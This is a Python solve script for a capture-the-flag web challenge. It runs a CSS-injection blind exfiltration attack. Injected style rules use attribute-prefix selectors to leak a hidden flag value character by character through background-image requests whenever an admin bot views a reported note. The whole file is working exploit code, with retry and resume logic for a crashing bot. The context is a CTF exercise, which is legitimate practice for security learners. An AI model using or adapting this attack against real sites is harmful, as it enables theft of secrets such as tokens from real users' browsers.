#!/usr/bin/env python3
# Approve Please, Genie! — batched CSS blind exfil, gentle + RESUMABLE.
#
# The flag is a YouTube link: PTITCTF{youtu.be/<id>...}. So use ONE combined URL-aware charset
# (no light/extended two-phase — that wastes a precious bot load on every special char).
# The admin bot (single headless browser) survives only ~2-3 note loads per instance, then
# crashes; resume across respawns via progress.txt.
#
# Usage:
#   python solve_fast.py 144.79.188.39:PORT                 # auto-resume progress.txt
#   python solve_fast.py 144.79.188.39:PORT "PTITCTF{youtu.be/"   # resume explicit prefix
import requests, string, sys, time, os

BASE = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39:38933"
if BASE.startswith("http"):
    _, __, BASE = BASE.partition("://")
ROOT = f"http://{BASE}"
S = requests.Session()

# URL-aware, single phase: video-id chars [A-Za-z0-9_-] + URL punctuation + closing brace.
# Ordered by likelihood so it reads nicely; correctness doesn't depend on order.
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-./}:?=&%~+#@!$*()[]<>., "

PROG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "progress.txt")
COOLDOWN_OK = 10
RETRY_WAIT  = 12
MAX_RETRY   = 3

def make_note(content):
    return S.post(f"{ROOT}/note", data={"content": content}, timeout=60).json()

def report_raw(nid):
    try:
        return S.post(f"{ROOT}/report", data={"id": nid}, timeout=60).json()
    except Exception as e:
        return {"error": f"net {e}"}

def leaks(tok):
    try:
        r = S.get(f"{ROOT}/leaks/{tok}", timeout=30).json()
        return r if isinstance(r, list) else []
    except Exception:
        return []

def batched_note(tok, known):
    rules = ["#note-content{display:block;width:40px;height:40px}"]
    for c in dict.fromkeys(CHARSET):  # dedupe just in case
        kv = (known + c).replace("\\", "\\\\").replace('"', '\\"')
        rules.append(f'#flag-holder[value^="{kv}"]~#note-content{{background:url(/collect?t={tok}&q={ord(c):02x})}}')
    return "<style>" + "".join(rules) + "</style>"

def load_progress():
    if len(sys.argv) > 2 and sys.argv[2].startswith("PTITCTF{"):
        return sys.argv[2]
    if os.path.exists(PROG):
        v = open(PROG).read().strip()
        if v.startswith("PTITCTF{"):
            return v
    return "PTITCTF{"

def leak_one(tok, known):
    note = make_note(batched_note(tok, known))
    base = len(leaks(tok))
    for k in range(MAX_RETRY):
        rep = report_raw(note["id"])
        if "visited" in str(rep):
            break
        print(f"    bot busy ({rep}) [{k+1}/{MAX_RETRY}]")
        if k < MAX_RETRY - 1:
            time.sleep(RETRY_WAIT)
    else:
        return ""  # bot dead
    for _ in range(15):
        time.sleep(2)
        cur = leaks(tok)
        if len(cur) > base:
            q = str(cur[-1].get("query", {}).get("q", ""))
            return chr(int(q, 16)) if len(q) == 2 else None
    return None

def solve():
    tok = make_note("<div>seed</div>")["leakToken"]
    known = load_progress()
    print(f"[*] {ROOT}  token {tok}  resume {known}")
    while len(known) < 120:
        c = leak_one(tok, known)
        if c == "":
            print(f"[!] bot dead. Progress saved: {known}")
            print("    -> RESPAWN instance, then rerun same command to resume."); return
        if c is None:
            print(f"[!] bot visited but no char matched at {known} (char outside CHARSET?)."); return
        known += c
        open(PROG, "w").write(known)
        print(f"[+] {known}")
        if c == "}":
            print("\n[FLAG]", known); return
        time.sleep(COOLDOWN_OK)

if __name__ == "__main__":
    solve()
